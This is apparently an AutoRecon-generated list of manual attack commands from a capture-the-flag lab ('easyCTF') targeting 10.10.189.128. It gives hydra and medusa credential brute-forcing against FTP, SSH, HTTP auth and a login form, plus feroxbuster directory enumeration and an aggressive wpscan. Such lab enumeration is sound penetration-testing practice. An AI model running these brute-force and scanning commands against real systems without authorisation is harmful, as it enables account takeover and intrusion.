```bash
[*] ftp on tcp/21

	[-] Bruteforce logins:

		hydra -L "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e nsr -s 21 -o "/home/kali/Documents/Portfolio/AutoRecon/easyCTF/results/10.10.189.128/scans/tcp21/tcp_21_ftp_hydra.txt" ftp://10.10.189.128

		medusa -U "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e ns -n 21 -O "/home/kali/Documents/Portfolio/AutoRecon/easyCTF/results/10.10.189.128/scans/tcp21/tcp_21_ftp_medusa.txt" -M ftp -h 10.10.189.128

[*] http on tcp/80

	[-] (feroxbuster) Multi-threaded recursive directory/file enumeration for web servers using various wordlists:

		feroxbuster -u http://10.10.189.128:80 -t 10 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x "txt,html,php,asp,aspx,jsp" -v -k -n -e -r -o /home/kali/Documents/Portfolio/AutoRecon/easyCTF/results/10.10.189.128/scans/tcp80/tcp_80_http_feroxbuster_dirbuster.txt

	[-] Credential bruteforcing commands (don't run these without modifying them):

		hydra -L "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e nsr -s 80 -o "/home/kali/Documents/Portfolio/AutoRecon/easyCTF/results/10.10.189.128/scans/tcp80/tcp_80_http_auth_hydra.txt" http-get://10.10.189.128/path/to/auth/area

		medusa -U "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e ns -n 80 -O "/home/kali/Documents/Portfolio/AutoRecon/easyCTF/results/10.10.189.128/scans/tcp80/tcp_80_http_auth_medusa.txt" -M http -h 10.10.189.128 -m DIR:/path/to/auth/area

		hydra -L "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e nsr -s 80 -o "/home/kali/Documents/Portfolio/AutoRecon/easyCTF/results/10.10.189.128/scans/tcp80/tcp_80_http_form_hydra.txt" http-post-form://10.10.189.128/path/to/login.php:"username=^USER^&password=^PASS^":"invalid-login-message"

		medusa -U "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e ns -n 80 -O "/home/kali/Documents/Portfolio/AutoRecon/easyCTF/results/10.10.189.128/scans/tcp80/tcp_80_http_form_medusa.txt" -M web-form -h 10.10.189.128 -m FORM:/path/to/login.php -m FORM-DATA:"post?username=&password=" -m DENY-SIGNAL:"invalid login message"

	[-] (wpscan) WordPress Security Scanner (useful if WordPress is found):

		wpscan --url http://10.10.189.128:80/ --no-update -e vp,vt,tt,cb,dbe,u,m --plugins-detection aggressive --plugins-version-detection aggressive -f cli-no-color 2>&1 | tee "/home/kali/Documents/Portfolio/AutoRecon/easyCTF/results/10.10.189.128/scans/tcp80/tcp_80_http_wpscan.txt"

[*] ssh on tcp/2222

	[-] Bruteforce logins:

		hydra -L "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e nsr -s 2222 -o "/home/kali/Documents/Portfolio/AutoRecon/easyCTF/results/10.10.189.128/scans/tcp2222/tcp_2222_ssh_hydra.txt" ssh://10.10.189.128

		medusa -U "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e ns -n 2222 -O "/home/kali/Documents/Portfolio/AutoRecon/easyCTF/results/10.10.189.128/scans/tcp2222/tcp_2222_ssh_medusa.txt" -M ssh -h 10.10.189.128


```